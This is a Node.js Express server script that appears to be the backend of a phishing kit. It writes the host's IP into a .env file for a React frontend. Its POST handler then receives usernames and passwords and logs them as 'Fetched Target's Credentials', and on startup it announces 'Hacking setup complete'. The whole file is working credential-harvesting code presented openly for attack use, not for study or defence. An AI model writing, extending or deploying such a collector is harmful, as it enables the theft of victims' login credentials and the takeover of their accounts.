const express = require('express')
const app = express()
const cors = require('cors')
const chalk = require('chalk')


// make .env for frontend ===========================================
const fs = require('fs');
const os = require('os');
const path = require('path');

// Helper to get local IP address
function getLocalIPAddress() {
  const interfaces = os.networkInterfaces();
  for (const iface of Object.values(interfaces)) {
    for (const config of iface) {
      if (config.family === 'IPv4' && !config.internal) {
        return config.address;
      }
    }
  }
  return '127.0.0.1';
}

// Read IP from command line or use default
const ip = process.argv[2] || getLocalIPAddress();
const envContent = `REACT_APP_SERVER_IP=${ip}\n`;

// Path to write the .env file
const targetPath = process.argv[3] || path.join(__dirname, '../', '.env');

// Write the file
fs.writeFileSync(targetPath, envContent);

// console.log(`✅ .env file created at ${targetPath} with IP: ${ip}`);
// done env=================================================

const port = 4000

app.use(express.json())
app.use(cors())

app.post('/', (req, res) => {

    console.log(chalk.yellow("Fetched Target's Credentials:"))
    console.log("\tusername:", chalk.red(req.body.username));
    console.log("\tpassword:", chalk.red(req.body.password));
    console.log("\n\n");


    res.json({
        hello: 'Hello World!'
    })
})

app.listen(port, () => {
  console.log(chalk.green(`Hacking setup complete at port:${port}\n`))
})